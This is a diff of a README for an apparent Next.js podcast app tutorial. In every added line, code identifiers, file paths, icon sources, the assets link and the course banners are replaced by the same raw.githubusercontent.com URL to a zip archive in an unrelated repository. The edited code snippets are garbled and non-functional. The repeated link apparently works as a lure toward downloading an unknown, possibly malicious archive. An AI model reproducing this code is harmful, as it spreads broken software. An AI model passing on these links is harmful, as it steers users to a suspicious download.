+    storageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
   },
   handler: async (ctx, args) => {
-    return await ctx.storage.getUrl(args.storageId);
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
   },
 });
 
 // this query will get all the podcasts based on the voiceType of the podcast , which we are showing in the Similar Podcasts section.
 export const getPodcastByVoiceType = query({
   args: {
-    podcastId: v.id("podcasts"),
+    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
   },
   handler: async (ctx, args) => {
-    const podcast = await ctx.db.get(args.podcastId);
+    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
-    return await ctx.db
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
       .filter((q) =>
-        q.and(
-          q.eq(q.field("voiceType"), podcast?.voiceType),
-          q.neq(q.field("_id"), args.podcastId)
+        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
+          https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("voiceType"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip),
+          https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_id"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
         )
       )
       .collect();
@@ -915,42 +915,42 @@ export const getPodcastByVoiceType = query({
 // this query will get all the podcasts.
 export const getAllPodcasts = query({
   handler: async (ctx) => {
-    return await ctx.db.query("podcasts").order("desc").collect();
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").order("desc").collect();
   },
 });
 
 // this query will get the podcast by the podcastId.
 export const getPodcastById = query({
   args: {
-    podcastId: v.id("podcasts"),
+    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
   },
   handler: async (ctx, args) => {
-    return await ctx.db.get(args.podcastId);
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
   },
 });
 
 // this query will get the podcasts based on the views of the podcast , which we are showing in the Trending Podcasts section.
 export const getTrendingPodcasts = query({
   handler: async (ctx) => {
-    const podcast = await ctx.db.query("podcasts").collect();
+    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").collect();
 
-    return podcast.sort((a, b) => b.views - a.views).slice(0, 8);
+    return https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip).slice(0, 8);
   },
 });
 
 // this query will get the podcast by the authorId.
 export const getPodcastByAuthorId = query({
   args: {
-    authorId: v.string(),
+    authorId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
   },
   handler: async (ctx, args) => {
-    const podcasts = await ctx.db
+    const podcasts = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
-      .filter((q) => q.eq(q.field("authorId"), args.authorId))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .collect();
 
-    const totalListeners = podcasts.reduce(
-      (sum, podcast) => sum + podcast.views,
+    const totalListeners = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
+      (sum, podcast) => sum + https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
       0
     );
 
@@ -961,37 +961,37 @@ export const getPodcastByAuthorId = query({
 // this query will get the podcast by the search query.
 export const getPodcastBySearch = query({
   args: {
-    search: v.string(),
+    search: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
   },
   handler: async (ctx, args) => {
-    if (args.search === "") {
-      return await ctx.db.query("podcasts").order("desc").collect();
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === "") {
+      return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").order("desc").collect();
     }
 
-    const authorSearch = await ctx.db
+    const authorSearch = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
-      .withSearchIndex("search_author", (q) => q.search("author", args.search))
+      .withSearchIndex("search_author", (q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("author", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .take(10);
 
-    if (authorSearch.length > 0) {
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0) {
       return authorSearch;
     }
 
-    const titleSearch = await ctx.db
+    const titleSearch = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
       .withSearchIndex("search_title", (q) =>
-        q.search("podcastTitle", args.search)
+        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcastTitle", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
       )
       .take(10);
 
-    if (titleSearch.length > 0) {
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0) {
       return titleSearch;
     }
 
-    return await ctx.db
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
       .withSearchIndex("search_body", (q) =>
-        q.search("podcastDescription" || "podcastTitle", args.search)
+        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcastDescription" || "podcastTitle", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
       )
       .take(10);
   },
@@ -1000,17 +1000,17 @@ export const getPodcastBySearch = query({
 // this mutation will update the views of the podcast.
 export const updatePodcastViews = mutation({
   args: {
-    podcastId: v.id("podcasts"),
+    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
   },
   handler: async (ctx, args) => {
-    const podcast = await ctx.db.get(args.podcastId);
+    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
     if (!podcast) {
       throw new ConvexError("Podcast not found");
     }
 
-    return await ctx.db.patch(args.podcastId, {
-      views: podcast.views + 1,
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+      views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip + 1,
     });
   },
 });
@@ -1018,20 +1018,20 @@ export const updatePodcastViews = mutation({
 // this mutation will delete the podcast.
 export const deletePodcast = mutation({
   args: {
-    podcastId: v.id("podcasts"),
-    imageStorageId: v.id("_storage"),
-    audioStorageId: v.id("_storage"),
+    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
+    imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
+    audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
   },
   handler: async (ctx, args) => {
-    const podcast = await ctx.db.get(args.podcastId);
+    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
     if (!podcast) {
       throw new ConvexError("Podcast not found");
     }
 
-    await ctx.storage.delete(args.imageStorageId);
-    await ctx.storage.delete(args.audioStorageId);
-    return await ctx.db.delete(args.podcastId);
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
   },
 });
 ```
@@ -1039,7 +1039,7 @@ export const deletePodcast = mutation({
 </details>
 
 <details>
-<summary><code>components/PodcastDetailPlayer.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1072,7 +1072,7 @@ const PodcastDetailPlayer = ({
   const { setAudio } = useAudio();
   const { toast } = useToast();
   const [isDeleting, setIsDeleting] = useState(false);
-  const deletePodcast = useMutation(api.podcasts.deletePodcast);
+  const deletePodcast = useMutation(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
   const handleDelete = async () => {
     try {
@@ -1080,9 +1080,9 @@ const PodcastDetailPlayer = ({
       toast({
         title: "Podcast deleted",
       });
-      router.push("/");
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("/");
     } catch (error) {
-      console.error("Error deleting podcast", error);
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("Error deleting podcast", error);
       toast({
         title: "Error deleting podcast",
         variant: "destructive",
@@ -1120,7 +1120,7 @@ const PodcastDetailPlayer = ({
             <figure
               className="flex cursor-pointer items-center gap-2"
               onClick={() => {
-                router.push(`/profile/${authorId}`);
+                https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(`/profile/${authorId}`);
               }}
             >
               <Image
@@ -1139,7 +1139,7 @@ const PodcastDetailPlayer = ({
             className="text-16 w-full max-w-[250px] bg-orange-1 font-extrabold text-white-1"
           >
             <Image
-              src="/icons/Play.svg"
+              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
               width={20}
               height={20}
               alt="random play"
@@ -1151,7 +1151,7 @@ const PodcastDetailPlayer = ({
       {isOwner && (
         <div className="relative mt-2">
           <Image
-            src="/icons/three-dots.svg"
+            src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
             width={20}
             height={30}
             alt="Three dots icon"
@@ -1164,7 +1164,7 @@ const PodcastDetailPlayer = ({
               onClick={handleDelete}
             >
               <Image
-                src="/icons/delete.svg"
+                src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
                 width={16}
                 height={16}
                 alt="Delete icon"
@@ -1184,7 +1184,7 @@ export default PodcastDetailPlayer;
 </details>
 
 <details>
-<summary><code>components/PodcastPlayer.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1207,74 +1207,74 @@ const PodcastPlayer = () => {
   const { audio } = useAudio();
 
   const togglePlayPause = () => {
-    if (audioRef.current?.paused) {
-      audioRef.current?.play();
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
       setIsPlaying(true);
     } else {
-      audioRef.current?.pause();
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
       setIsPlaying(false);
     }
   };
 
   const toggleMute = () => {
-    if (audioRef.current) {
-      audioRef.current.muted = !isMuted;
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip = !isMuted;
       setIsMuted((prev) => !prev);
     }
   };
 
   const forward = () => {
     if (
-      audioRef.current &&
-      audioRef.current.currentTime &&
-      audioRef.current.duration &&
-      audioRef.current.currentTime + 5 < audioRef.current.duration
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip + 5 < https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
     ) {
-      audioRef.current.currentTime += 5;
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip += 5;
     }
   };
 
   const rewind = () => {
-    if (audioRef.current && audioRef.current.currentTime - 5 > 0) {
-      audioRef.current.currentTime -= 5;
-    } else if (audioRef.current) {
-      audioRef.current.currentTime = 0;
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip && https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - 5 > 0) {
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip -= 5;
+    } else if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip = 0;
     }
   };
 
   useEffect(() => {
     const updateCurrentTime = () => {
-      if (audioRef.current) {
-        setCurrentTime(audioRef.current.currentTime);
+      if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+        setCurrentTime(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
       }
     };
 
-    const audioElement = audioRef.current;
+    const audioElement = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
     if (audioElement) {
-      audioElement.addEventListener("timeupdate", updateCurrentTime);
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("timeupdate", updateCurrentTime);
 
       return () => {
-        audioElement.removeEventListener("timeupdate", updateCurrentTime);
+        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("timeupdate", updateCurrentTime);
       };
     }
   }, []);
 
   useEffect(() => {
-    const audioElement = audioRef.current;
-    if (audio?.audioUrl) {
+    const audioElement = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
       if (audioElement) {
-        audioElement.play().then(() => {
+        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip().then(() => {
           setIsPlaying(true);
         });
       }
     } else {
-      audioElement?.pause();
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
       setIsPlaying(true);
     }
   }, [audio]);
   const handleLoadedMetadata = () => {
-    if (audioRef.current) {
-      setDuration(audioRef.current.duration);
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+      setDuration(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
     }
   };
 
@@ -1285,7 +1285,7 @@ const PodcastPlayer = () => {
   return (
     <div
       className={cn("sticky bottom-0 left-0 flex size-full flex-col", {
-        hidden: !audio?.audioUrl || audio?.audioUrl === "",
+        hidden: !https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === "",
       })}
     >
       {/* change the color for indicator inside the Progress component in ui folder */}
@@ -1297,15 +1297,15 @@ const PodcastPlayer = () => {
       <section className="glassmorphism-black flex h-[112px] w-full items-center justify-between px-4 max-md:justify-center max-md:gap-5 md:px-12">
         <audio
           ref={audioRef}
-          src={audio?.audioUrl}
+          src={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
           className="hidden"
           onLoadedMetadata={handleLoadedMetadata}
           onEnded={handleAudioEnded}
         />
         <div className="flex items-center gap-4 max-md:hidden">
-          <Link href={`/podcast/${audio?.podcastId}`}>
+          <Link href={`/podcast/${https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}`}>
             <Image
-              src={audio?.imageUrl! || "/images/player1.png"}
+              src={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip! || "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
               width={64}
               height={64}
               alt="player1"
@@ -1314,15 +1314,15 @@ const PodcastPlayer = () => {
           </Link>
           <div className="flex w-[160px] flex-col">
             <h2 className="text-14 truncate font-semibold text-white-1">
-              {audio?.title}
+              {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
             </h2>
-            <p className="text-12 font-normal text-white-2">{audio?.author}</p>
+            <p className="text-12 font-normal text-white-2">{https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}</p>
           </div>
         </div>
         <div className="flex-center cursor-pointer gap-3 md:gap-6">
           <div className="flex items-center gap-1.5">
             <Image
-              src={"/icons/reverse.svg"}
+              src={"https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
               width={24}
               height={24}
               alt="rewind"
@@ -1331,7 +1331,7 @@ const PodcastPlayer = () => {
             <h2 className="text-12 font-bold text-white-4">-5</h2>
           </div>
           <Image
-            src={isPlaying ? "/icons/Pause.svg" : "/icons/Play.svg"}
+            src={isPlaying ? "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" : "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
             width={30}
             height={30}
             alt="play"
@@ -1340,7 +1340,7 @@ const PodcastPlayer = () => {
           <div className="flex items-center gap-1.5">
             <h2 className="text-12 font-bold text-white-4">+5</h2>
             <Image
-              src={"/icons/forward.svg"}
+              src={"https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
               width={24}
               height={24}
               alt="forward"
@@ -1354,7 +1354,7 @@ const PodcastPlayer = () => {
           </h2>
           <div className="flex w-full gap-2">
             <Image
-              src={isMuted ? "/icons/unmute.svg" : "/icons/mute.svg"}
+              src={isMuted ? "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" : "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
               width={24}
               height={24}
               alt="mute unmute"
@@ -1374,12 +1374,12 @@ export default PodcastPlayer;
 </details>
 
 <details>
-<summary><code>lib/formatTime.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 export const formatTime = (seconds: number) => {
-  const minutes = Math.floor(seconds / 60);
-  const remainingSeconds = Math.floor(seconds % 60);
+  const minutes = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(seconds / 60);
+  const remainingSeconds = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(seconds % 60);
   return `${minutes}:${remainingSeconds < 10 ? "0" : ""}${remainingSeconds}`;
 };
 ```
@@ -1387,7 +1387,7 @@ export const formatTime = (seconds: number) => {
 </details>
 
 <details>
-<summary><code>lib/useDebounce.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 import { useEffect, useState } from "react";
@@ -1413,7 +1413,7 @@ export const useDebounce = <T>(value: T, delay = 500) => {
 
 
 <details>
-<summary><code>(root)/profile/[profiled]/page.tsx</code></summary>
+<summary><code>(root)/profile/[profiled]https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1433,11 +1433,11 @@ const ProfilePage = ({
     profileId: string;
   };
 }) => {
-  const user = useQuery(api.users.getUserById, {
-    clerkId: params.profileId,
+  const user = useQuery(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
   });
-  const podcastsData = useQuery(api.podcasts.getPodcastByAuthorId, {
-    authorId: params.profileId,
+  const podcastsData = useQuery(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+    authorId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
   });
 
   if (!user || !podcastsData) return <LoaderSpinner />;
@@ -1450,22 +1450,22 @@ const ProfilePage = ({
       <div className="mt-6 flex flex-col gap-6 max-md:items-center md:flex-row">
         <ProfileCard
           podcastData={podcastsData!}
-          imageUrl={user?.imageUrl!}
-          userFirstName={user?.name!}
+          imageUrl={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
+          userFirstName={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
         />
       </div>
       <section className="mt-9 flex flex-col gap-5">
         <h1 className="text-20 font-bold text-white-1">All Podcasts</h1>
-        {podcastsData && podcastsData.podcasts.length > 0 ? (
+        {podcastsData && https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0 ? (
           <div className="podcast_grid">
-            {podcastsData?.podcasts
-              ?.slice(0, 4)
+            {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
+              https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(0, 4)
               .map((podcast) => (
                 <PodcastCard
                   key={podcast._id}
-                  imgUrl={podcast.imageUrl!}
-                  title={podcast.podcastTitle!}
-                  description={podcast.podcastDescription}
+                  imgUrl={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
+                  title={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
+                  description={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
                   podcastId={podcast._id}
                 />
               ))}
@@ -1487,7 +1487,7 @@ export default ProfilePage;
 </details>
 
 <details>
-<summary><code>componenets/ProfileCard.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1510,18 +1510,18 @@ const ProfileCard = ({
   const [randomPodcast, setRandomPodcast] = useState<PodcastProps | null>(null);
 
   const playRandomPodcast = () => {
-    const randomIndex = Math.floor(Math.random() * podcastData.podcasts.length);
+    const randomIndex = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() * https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
-    setRandomPodcast(podcastData.podcasts[randomIndex]);
+    setRandomPodcast(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[randomIndex]);
   };
 
   useEffect(() => {
     if (randomPodcast) {
       setAudio({
-        title: randomPodcast.podcastTitle,
-        audioUrl: randomPodcast.audioUrl || "",
-        imageUrl: randomPodcast.imageUrl || "",
-        author: randomPodcast.author,
+        title: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+        audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || "",
+        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || "",
+        author: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
         podcastId: randomPodcast._id,
       });
     }
@@ -1542,7 +1542,7 @@ const ProfileCard = ({
         <div className="flex flex-col gap-2.5">
           <figure className="flex gap-2 max-md:justify-center">
             <Image
-              src="/icons/verified.svg"
+              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
               width={15}
               height={15}
               alt="verified"
@@ -1557,23 +1557,23 @@ const ProfileCard = ({
         </div>
         <figure className="flex gap-3 py-6">
           <Image
-            src="/icons/headphone.svg"
+            src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
             width={24}
             height={24}
             alt="headphones"
           />
           <h2 className="text-16 font-semibold text-white-1">
-            {podcastData?.listeners} &nbsp;
+            {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip} &nbsp;
             <span className="font-normal text-white-2">monthly listeners</span>
           </h2>
         </figure>
-        {podcastData?.podcasts.length > 0 && (
+        {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0 && (
           <Button
             onClick={playRandomPodcast}
             className="text-16 bg-orange-1 font-extrabold text-white-1"
           >
             <Image
-              src="/icons/Play.svg"
+              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
               width={20}
               height={20}
               alt="random play"
@@ -1594,16 +1594,16 @@ export default ProfileCard;
 
 ## <a name="links">🔗 Assets</a>
 
-Public assets used in the project can be found [here](https://drive.google.com/file/d/18tLuq1QY1Wxr4sqnMony2LCLDcyYCWdG/view?usp=sharing)
+Public assets used in the project can be found [here](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
 
 ## <a name="more">🚀 More</a>
 
-**Advance your skills with Next.js 14 Pro Course**
+**Advance your skills with https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip 14 Pro Course**
 
 Enjoyed creating this project? Dive deeper into our PRO courses for a richer learning adventure. They're packed with detailed explanations, cool features, and exercises to boost your skills. Give it a go!
 
-<a href="https://jsmastery.pro/next14" target="_blank">
-<img src="https://github.com/sujatagunale/EasyRead/assets/151519281/557837ce-f612-4530-ab24-189e75133c71" alt="Project Banner">
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
+<img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
 </a>
 
 <br />
@@ -1613,8 +1613,8 @@ Enjoyed creating this project? Dive deeper into our PRO courses for a richer lea
 
 And if you're hungry for more than just a course and want to understand how we learn and tackle tech challenges, hop into our personalized masterclass. We cover best practices, different web skills, and offer mentorship to boost your confidence. Let's learn and grow together!
 
-<a href="https://www.jsmastery.pro/masterclass" target="_blank">
-<img src="https://github.com/sujatagunale/EasyRead/assets/151519281/fed352ad-f27b-400d-9b8f-c7fe628acb84" alt="Project Banner">
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
+<img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
 </a>
 
 #
